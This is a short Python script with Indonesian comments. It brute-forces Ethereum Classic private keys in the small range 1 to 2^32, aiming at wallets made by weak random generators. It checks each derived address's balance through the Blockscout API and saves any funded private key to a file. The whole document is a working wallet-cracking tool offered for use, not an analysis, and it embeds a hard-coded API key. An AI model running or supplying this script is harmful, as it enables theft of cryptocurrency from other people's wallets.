import os
import random
import requests
import subprocess
from eth_keys import keys
from eth_utils import decode_hex

# Cek & install modul jika belum ada
def install_modules():
    required_modules = ["requests", "eth_keys", "eth_utils"]
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            print(f"[*] Installing {module}...")
            subprocess.check_call(["pip", "install", module])

install_modules()  # Jalankan instalasi otomatis

# API Blockscout untuk cek saldo
API_KEY = "54314a85-e401-4784-a7c8-1824ae5d280c"  # Ganti dengan API key lu
BASE_URL = "https://etc.blockscout.com/api"

# Rentang angka untuk private key (misalnya bug dari generator random yang lemah)
START_RANGE = 1
END_RANGE = 2**32  # Range kecil, kemungkinan bug di sistem tertentu

# Fungsi untuk cek saldo wallet ETC
def check_balance(address):
    url = f"{BASE_URL}?module=account&action=balance&address={address}&apikey={API_KEY}"
    response = requests.get(url)
    if response.status_code == 200:
        balance = int(response.json().get("result", 0))
        return balance / 10**18  # Convert Wei ke ETC
    return 0

# Loop untuk generate private key random dan cek saldo
for _ in range(1000):  # Coba 1000 key random
    private_int = random.randint(START_RANGE, END_RANGE)
    private_key = keys.PrivateKey(private_int.to_bytes(32, 'big'))
    address = private_key.public_key.to_address()

    balance = check_balance(address)
    if balance > 0:
        print(f"[+] Found! Address: {address}, Balance: {balance} ETC")
        with open("found_keys.txt", "a") as file:
            file.write(f"{private_key} | {address} | {balance} ETC\n")
    else:
        print(f"[-] Checked: {address} - No balance")
